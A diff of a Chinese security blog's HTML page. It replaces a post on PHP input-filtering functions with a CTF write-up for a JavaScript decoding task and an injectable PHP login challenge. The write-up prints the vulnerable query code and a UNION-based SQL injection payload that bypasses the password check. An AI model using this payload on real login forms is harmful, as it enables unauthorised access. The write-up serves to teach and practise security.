@@ -61,22 +61,19 @@
 
 <meta name="description" content="点击阅读全文">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php内置过滤函数总结">
-<meta property="og:url" content="http://uknowsec.cn/posts/notes/php内置过滤函数总结.html">
+<meta property="og:title" content="week 2 for cnas writeup">
+<meta property="og:url" content="http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html">
 <meta property="og:site_name" content="Uknow’s Blog">
 <meta property="og:description" content="点击阅读全文">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/addslashes%28%291.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/mysql_escape_string.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/mysql_real_escape_string.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/htmlspecialchars.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/strip_tag.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/escapeshellcmd.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/escapeshellarg.png">
-<meta property="og:updated_time" content="2017-11-20T10:00:57.482Z">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%872.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/base6.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/sqlsql.png">
+<meta property="og:updated_time" content="2017-11-25T05:50:49.550Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php内置过滤函数总结">
+<meta name="twitter:title" content="week 2 for cnas writeup">
 <meta name="twitter:description" content="点击阅读全文">
-<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/addslashes%28%291.png">
+<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png">
 
 
 
@@ -94,7 +91,7 @@
   };
 </script>
 
-  <title> php内置过滤函数总结 | Uknow’s Blog </title>
+  <title> week 2 for cnas writeup | Uknow’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -257,7 +254,7 @@ var _hmt = _hmt || [];
             
             
               
-                php内置过滤函数总结
+                week 2 for cnas writeup
               
             
           </h1>
@@ -269,8 +266,8 @@ var _hmt = _hmt || [];
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-11-20T15:56:31+08:00" content="2017-11-20">
-              2017-11-20
+            <time itemprop="dateCreated" datetime="2017-11-25T11:41:12+08:00" content="2017-11-25">
+              2017-11-25
             </time>
           </span>
 
@@ -283,8 +280,8 @@ var _hmt = _hmt || [];
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/notes/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -299,8 +296,8 @@ var _hmt = _hmt || [];
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/posts/notes/php内置过滤函数总结.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/notes/php内置过滤函数总结.html" itemprop="commentsCount"></span>
+                <a href="/posts/ctf/week-2-for-cnas-writeup.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/ctf/week-2-for-cnas-writeup.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -310,7 +307,7 @@ var _hmt = _hmt || [];
 
           
           
-             <span id="/posts/notes/php内置过滤函数总结.html" class="leancloud_visitors" data-flag-title="php内置过滤函数总结">
+             <span id="/posts/ctf/week-2-for-cnas-writeup.html" class="leancloud_visitors" data-flag-title="week 2 for cnas writeup">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -332,20 +329,16 @@ var _hmt = _hmt || [];
 
       
         <p>点击阅读全文<br><a id="more"></a></p>
-<p>PHP本身内置了很多参数过滤的函数，以方便开发者简单有效且统一地进行安全防护，而这些函数可以分为多种类型，如SQL注入过滤函数，XSS过滤函数，命令执行过滤函数，代码执行过滤函数等等。</p>
-<h2 id="SQL注入过滤函数"><a href="#SQL注入过滤函数" class="headerlink" title="SQL注入过滤函数"></a>SQL注入过滤函数</h2><p>SQL注入过滤函数有addslashes(),mysql_real_escape_string()以及mysql_escape_string(),它们的作用都是给字符串添加反斜杠（\）来转义掉单引号（’）、双引号（”）以及空格符NULL。</p>
-<p>addslashes()和mysql_escape_string()函数都是直接在敏感字符串前加反斜杠，可能会存在宽字节注入。可参考我之前的博客</p>
-<p><a href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">宽字节注入漏洞的利用与学习</a></p>
-<p>而mysql_real_escape_string()函数会考虑当前连接数据库的字符集编码。</p>
-<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
+<h2 id="火星文-50"><a href="#火星文-50" class="headerlink" title="火星文 50"></a>火星文 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="external">http://47.100.121.220:28001/</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%872.png" alt=""></p>
+<p>A跑出来是一串密文，B跑出来是一个解密脚本</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/base6.png" alt=""></p>
+<h2 id="用户登录-100"><a href="#用户登录-100" class="headerlink" title="用户登录 100"></a>用户登录 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/" target="_blank" rel="external">http://47.100.121.220:28002/</a></p>
+<h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><p>mysql_query() 函数</p>
+<p>mysql_query() 函数执行一条 MySQL 查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_query(query,connection)</div></pre></td></tr></table></figure>
 <table>
 <thead>
 <tr>
@@ -355,58 +348,18 @@ var _hmt = _hmt || [];
 </thead>
 <tbody>
 <tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要转义的字符串。</td>
-</tr>
-</tbody>
-</table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = addslashes($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/addslashes%28%291.png" alt=""></p>
-<h3 id="mysql-escape-string"><a href="#mysql-escape-string" class="headerlink" title="mysql_escape_string()"></a>mysql_escape_string()</h3><p>在PHP5.3中已经弃用mysql_escape_string()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_escape_string()并不转义%和_</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = mysql_escape_string($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/mysql_escape_string.png" alt=""></p>
-<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
-<p>下列字符受影响：</p>
-<ul>
-<li>\x00</li>
-<li>\n</li>
-<li>\r</li>
-<li>\</li>
-<li>‘</li>
-<li>“</li>
-<li>\x1a</li>
-</ul>
-<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_real_escape_string(string,connection)</div></pre></td></tr></table></figure>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要转义的字符串。</td>
+<td>query</td>
+<td style="text-align:center">必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</td>
 </tr>
 <tr>
 <td>connection</td>
-<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
+<td style="text-align:center">可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</td>
 </tr>
 </tbody>
 </table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">if($str = mysql_real_escape_string($id))</div><div class="line">	echo $str;</div><div class="line">else</div><div class="line">	echo &apos;false&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/mysql_real_escape_string.png" alt=""></p>
-<h2 id="XSS过滤函数"><a href="#XSS过滤函数" class="headerlink" title="XSS过滤函数"></a>XSS过滤函数</h2><p>XSS过滤函数有htmlspecialchars()和strip_tags()</p>
-<h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
-<p>预定义的字符是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&amp;转换成&amp;amp</div><div class="line">&quot;转换成&amp;quot</div><div class="line">&apos;转换成&amp;#039</div><div class="line">&lt;转换成&amp;lt</div><div class="line">&gt;转换成&amp;gt</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = htmlspecialchars($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/htmlspecialchars.png" alt=""></p>
-<h3 id="strip-tag-函数"><a href="#strip-tag-函数" class="headerlink" title="strip_tag()函数"></a>strip_tag()函数</h3><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strip_tags(string,allow)</div></pre></td></tr></table></figure>
+<p>mysql_fetch_array() 函数</p>
+<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_fetch_array(data,array_type)</div></pre></td></tr></table></figure>
 <table>
 <thead>
 <tr>
@@ -416,27 +369,54 @@ var _hmt = _hmt || [];
 </thead>
 <tbody>
 <tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要检查的字符串。</td>
+<td>data</td>
+<td style="text-align:center">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td>
 </tr>
 <tr>
-<td>allow</td>
-<td style="text-align:center">可选。规定允许的标签。这些标签不会被删除。</td>
+<td>array_type</td>
+<td style="text-align:center">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组 MYSQL_NUM - 数字数组 MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
 </tr>
 </tbody>
 </table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = strip_tags($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/strip_tag.png" alt=""></p>
-<h2 id="命令执行过滤函数"><a href="#命令执行过滤函数" class="headerlink" title="命令执行过滤函数"></a>命令执行过滤函数</h2><p>PHP提供了escapeshellcmd()和escapeshellarg()两个函数对参数进行过滤</p>
-<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><p>在Windows下过滤方式是在字符前面加上一个^符号<br>在Linux是在字符前加上反斜杠（\）</p>
-<p>过滤字符如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&amp;</div><div class="line">;</div><div class="line">`</div><div class="line">|</div><div class="line">*</div><div class="line">?</div><div class="line">~</div><div class="line">&lt;</div><div class="line">&gt;</div><div class="line">^</div><div class="line">(</div><div class="line">)</div><div class="line">[</div><div class="line">]</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line">$</div><div class="line">\</div><div class="line">\</div><div class="line">x0A</div><div class="line">\xFF</div><div class="line">%</div></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = escapeshellcmd($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/escapeshellcmd.png" alt=""></p>
-<h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><p>给所有参数加上一对双引号，强制为字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = escapeshellarg($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/escapeshellarg.png" alt=""></p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.cnseay.com/4239/" target="_blank" rel="external">《代码审计：企业级web代码安全架构》</a></p>
-
+<p>strcasecmp() 函数</p>
+<p>strcasecmp() 函数比较两个字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strcasecmp(string1,string2)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string1</td>
+<td style="text-align:center">必需。规定要比较的第一个字符串。</td>
+</tr>
+<tr>
+<td>string2</td>
+<td style="text-align:center">必需。规定要比较的第二个字符串。</td>
+</tr>
+</tbody>
+</table>
+<p>以上是本题涉及到的几个函数。</p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;config.php&quot;;</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</div><div class="line">    $user = $_POST[&quot;user&quot;];</div><div class="line">    $pass = md5($_POST[&quot;pass&quot;]);</div><div class="line">    $auth = false;</div><div class="line">    </div><div class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</div><div class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</div><div class="line">    </div><div class="line">    $sql = &quot;select password from user where user=&apos;$user&apos;&quot;;</div><div class="line">    $query = mysql_query($sql);</div><div class="line">    if(!$query) &#123;</div><div class="line">        mysql_close($conn);</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">    if($row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])) &#123;</div><div class="line">        $auth = true;</div><div class="line">    &#125;</div><div class="line">    mysql_close($conn);</div><div class="line">    </div><div class="line">    if($auth) &#123;</div><div class="line">        echo &quot;login success!&quot;;</div><div class="line">        echo $flag;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;$user&apos;</div></pre></td></tr></table></figure>
+<p>是存在SQL注入的，但是用户名和密码是分开判断。所以普通的万能密码是不行的。</p>
+<p>\$row[“password”]的值是从$sql提取出来的,<br>然后经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])</div></pre></td></tr></table></figure></p>
+<p>进行密码判断。</p>
+<p>我们可以构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AND 0=1 UNION SELECT md(1) #</div></pre></td></tr></table></figure>
+<p>拼接到\$sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;&apos;AND 0=1 UNION SELECT md(1) #&quot;</div></pre></td></tr></table></figure></p>
+<ol>
+<li>最前面的单引号：闭合原文的where user=’</li>
+<li>AND 0=1:为了使前面的表达式返回值为空.</li>
+<li>接着我们使用UNION SELECT MD5(1)，直接把MD5值作为返回值retuen给$sql，这样在查询的时候$query就会有值.</li>
+<li>最后的#用来注释掉后面没用的东西</li>
+</ol>
+<p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username:&apos; and 0=1 union select md5(1)#</div><div class="line">password:1</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sqlsql.png" alt=""></p>
+<h2 id="You-have-no-permissions-150"><a href="#You-have-no-permissions-150" class="headerlink" title="You have no permissions 150"></a>You have no permissions 150</h2>
       
     </div>
 
@@ -453,17 +433,13 @@ var _hmt = _hmt || [];
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/ctf/week-1-for-cnas-writeup.html" rel="next" title="week 1 for cnas writeup">
-                <i class="fa fa-chevron-left"></i> week 1 for cnas writeup
+              <a href="/posts/notes/php内置过滤函数总结.html" rel="next" title="php内置过滤函数总结">
+                <i class="fa fa-chevron-left"></i> php内置过滤函数总结
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/posts/ctf/week-2-for-cnas-writeup.html" rel="prev" title="week 2 for cnas writeup">
-                week 2 for cnas writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -512,8 +488,8 @@ var _hmt = _hmt || [];
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="posts/notes/php内置过滤函数总结.html"
-           data-title="php内置过滤函数总结" data-url="http://uknowsec.cn/posts/notes/php内置过滤函数总结.html">
+      <div class="ds-thread" data-thread-key="posts/ctf/week-2-for-cnas-writeup.html"
+           data-title="week 2 for cnas writeup" data-url="http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html">
       </div>
     
   </div>
@@ -635,7 +611,7 @@ var _hmt = _hmt || [];
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入过滤函数"><span class="nav-number">1.</span> <span class="nav-text">SQL注入过滤函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addslashes"><span class="nav-number">1.1.</span> <span class="nav-text">addslashes()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-escape-string"><span class="nav-number">1.2.</span> <span class="nav-text">mysql_escape_string()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-real-escape-string"><span class="nav-number">1.3.</span> <span class="nav-text">mysql_real_escape_string()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS过滤函数"><span class="nav-number">2.</span> <span class="nav-text">XSS过滤函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#htmlspecialchars"><span class="nav-number">2.1.</span> <span class="nav-text">htmlspecialchars()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strip-tag-函数"><span class="nav-number">2.2.</span> <span class="nav-text">strip_tag()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行过滤函数"><span class="nav-number">3.</span> <span class="nav-text">命令执行过滤函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#escapeshellcmd"><span class="nav-number">3.1.</span> <span class="nav-text">escapeshellcmd()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#escapeshellarg"><span class="nav-number">3.2.</span> <span class="nav-text">escapeshellarg()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#火星文-50"><span class="nav-number">1.</span> <span class="nav-text">火星文 50</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接"><span class="nav-number">1.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答"><span class="nav-number">1.2.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户登录-100"><span class="nav-number">2.</span> <span class="nav-text">用户登录 100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本知识"><span class="nav-number">2.2.</span> <span class="nav-text">基本知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答-1"><span class="nav-number">2.3.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#You-have-no-permissions-150"><span class="nav-number">3.</span> <span class="nav-text">You have no permissions 150</span></a></li></ol></div>
             
           </div>
         </section>
